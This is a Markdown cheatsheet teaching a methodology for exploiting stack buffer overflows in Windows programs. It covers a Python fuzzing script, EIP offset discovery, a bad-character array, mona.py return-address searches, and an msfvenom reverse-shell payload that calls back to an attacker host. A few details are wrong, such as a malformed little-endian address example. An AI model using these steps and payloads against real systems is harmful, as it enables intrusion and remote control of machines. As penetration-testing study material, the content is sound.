---
title: "Buffer overflows"
author: "Me"
date: "January 26, 2022"
output: html_document
---

# Buffer overflows
{:.no_toc}

This cheatsheets aims to provide the methodology of exploiting a buffer overflow vulnerability.

Here's the content so far:

1. TOC
{:toc}
{:style="color:black; font-size: 150%;"}

# 1. Start the targeted application and attach a debugger to it.
On Windows, attach Immunity Debugger.
On Windows, attach EDB.

# 2. Fuzz the application to discover a BO vulnerability
Once the debugger is attached to the running process, we fuzz the application to see if it is vulnerable to buffer overflows.
Example Python PoC:

````
#!/usr/bin/python
import socket
import time
import sys

size = 100

while(size < 2000):
  try:
    print "\nSending evil buffer with %s bytes" % size

    buffer = "A" * size

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("<Target IP>", <Target port>))
    s.send(buffer)
    
    s.close()
    
    size += 100
    time.sleep(3)
    
    print "\nDone!"
  except:
    print "Could not connect!"
    sys.exit()
````
With this script, we see the approximate number of bytes required to crash the application. Let's assume it is 800 for the sake of the example.
Then, we look at the CPU registers to see if they have been overwritten by our buffer of A's. If it is the case, the application may be vulnerable to BO.

# 3. Find the offset to control _EIP_
If in the previous step the value contained in the _EIP_ register got overwritten by A's, we need to know exactly which A's of the buffer it was.
We create a unique sequence of bytes with _msf-pattern_create_ (length 800 for the example):
````
msf-pattern_create -l 800
`````
We update the PoC with this new buffer, and launch the exploit. We look at the value contained in _EIP_ and determine the offset with _msf-pattern_offset_:
````
msf-pattern_offset -l 800 -q <value in EIP>
`````
Let's assume the offset is located at the byte 710. 
With this information, we modify the buffer to send 710 * A, 4 * B, and (800-710-4) * C. We make sure we indeed control EIP.


# 4. Find space for the shellcode
In this step, we inspect the different registers at the time of the crash to see if any of them points to or close to our buffer (of A's or C's). 
We then look at the available space, considering that a typicial reverse shell payload is approximately 350-450 bytes long.
If there isn't enough space, we can use a first stage shell code to specify another address in memory as well as to align some registers if necessary.

# 5. Find bad characters
Modify to PoC to include every possible character, from 0x00 to 0xff, in the buffer. This can be done either in the A's before EIP, or in the C's after it.
Ideally, we include them at a location where we can send the whole badchar array at once. If it is not possible, we split it in smaller chunks.

````
badchars = (
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
`````
We inspect the dump at the time of the crash to see if any of those characters disappeared, truncating the rest of the buffer. 
If it is the case, we remove it and repeat the process until everything works fine.

# 6. Find a return adress
Once we located space for our future payload as well as a register pointing towards it, we need to find a return address such as a _JMP ESP_, _JMP EAX_, and so on...
We use the _mona.py_ script to search in all the modules (DLLs) loaded by the running application:

````
!mona modules
````
In the list returned by this command, we must pay attention to two details:
- The base address at which the module is loaded can not contain any of the bad characters that were identified.
- We must chose a module that wasn't compiled with ASLR or DEP support.

Once we found a module, we can search within it for the instruction we're looking for. 
We need to specify the opcode of this latter, which can be obbtained with _msf-nasm_shell_:
````
msf-nasm_shell
````
For example to find the opcde of _JMP ESP_, we would simply type this instruction and the tool would give us the corresponding opcode, FFE4.
We can use _mona.py_ once again to find this instruction in the given module:
````
!mona find -s "\xff\xe4" -m "modulename"
`````
If mona finds the instruction in the module, we muust make sure its address doesn't contain any bad characters.
If everything is ok, we can replace the B's in EIP by the address of the instruction.
Note that we must pay attention to the architecture: However, most modern machines use little-endian. Therefore, we must write the address backwards.\\
Example: we found a _JMP ESP_ at the address 0x10935c71. In little endian, we will write \x71\x5c\93\x10.\\
In Immunity, we can then go to that address to make sure it is the correct instruction, set a bbreakpoint on it, and rerun the exploit.

# 7. Generate the shellcode
We use _msfvenom_ to generate the shellcode:

````
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<Kali IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -b “\x00\x0a\x0d\x25\x26\x2b\x3d"
````
This is an example payload that should be modified accordingly to the target OS, architecture, bad characters (specified after _-b_), wanted encoder, and so on...
We then place this shellcode in our PoC, and add a NOP slide before it. 
It can be useful to run the exploit with a breakpoint on the return address, so that we can jump into the into the instruction and do the final required modifications.


